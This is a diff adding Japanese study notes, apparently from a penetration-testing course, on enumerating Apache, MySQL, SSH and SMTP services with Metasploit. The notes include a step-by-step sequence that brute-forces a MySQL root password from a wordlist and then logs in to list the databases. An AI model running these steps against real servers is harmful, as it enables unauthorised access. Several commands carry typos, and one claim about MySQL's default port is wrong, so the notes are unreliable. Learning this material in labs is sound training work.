@@ -243,9 +243,76 @@ quiz
 ・列挙の目的でhttpヘッダーを取得するために使用されるhttpリクエストメソッドは、GET
 ・
 
+task 標的のapacheウェブサーバーに関する情報を可能な限り収集すること
+1) kalilinuxを起動
+2) pingコマンドを使ってターゲットマシンにアクセスできるか確認する。
+3) 以下のコマンドで、metasploitフレームワークコンソールを開く
+mfsconsole -q
+4) ターゲットに対して、metasploit補助モジュールを1つずつ実行
 
 
+Mysqlの列挙
+・MySQLとは、SQLをベースにしたオープンソースのリレーショナルデータベース管理システム
+・通常は、顧客データに関連する様々なタイプのデータの記録に使用される
+→最も一般的なのは、web applicatiom dataを保存するために使用される
+・検出を回避するために、MySQLはデフォルトでは、TCPポート3306に設定されているものを変更する。
 
+・プロセス
+1) ifconfigでターゲットのIPアドレスを取得
+2) service postgresql start
+3) msfconsole
+4) workspace -a name
+5) setg RHOSTS IPアドレス
+6) setg RHOST IPアドレス
+7) search type:auxiliary name:sql
+8) use auxiliary/scanner/mysql/mysql_version
+9) show options
+10) search portacan
+11) use auxiliary/scanner/portscan/tcp
+12) show options
+13) run
+14) use auxiliary/scanner/mysql/mysql_version
+15) show options
+16) run
+17) search mysql_login
+18) use use auxiliary/scanner/mysql/mysql_iogin
+19) show options
+20) set USERNAME root
+21) set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+22) run
+23) search mysql_enum
+24) use auxiliary/admin/mysql/mysql_enum
+25) info
+26) set PASSWORD twinkle
+27) set USERNAME root
+28) run
+29) search my_sql
+30) use auxiliary/admin/mysql/mysql_sql
+31) show options
+32) set PASSWORD twinkle
+33) set USERNAME root
+34) run
+35) show options
+36) set SQL show databases;
+37) run
+38) 
+
+SSH列挙
+・sshは、暗号化機能を備えたリモート管理プロトコルである。
+・通常は、サーバーやシステムへのリモートアクセスで使用する。
+・sshのデフォルトのポートは22
+→空いているポートを使用するように設定可能
+・補助モジュールを利用して、ターゲットで実行されているSSHのバージョンを列挙したり、ブルートフォース攻撃を実行してパスワードを特定し、結果としてターゲットへのリモートアクセスを可能にしたりすることができます。
+
+quiz
+・クリアテキストパスワードではなくsshキーベースの認証を使用する利点は、キーはより安全な認証方法を提供する。
+
+smtp列挙
+・smtpは、電子メールの送信で使用されるコミュニケーションプロトコル
+・smtpはデフォルトでport25を使用する。また、tcp port465と587で実行するように設定することも可能
+
+quiz
+・smtp列挙モジュールは、ユーザーアカウントを提供する
 
 
 
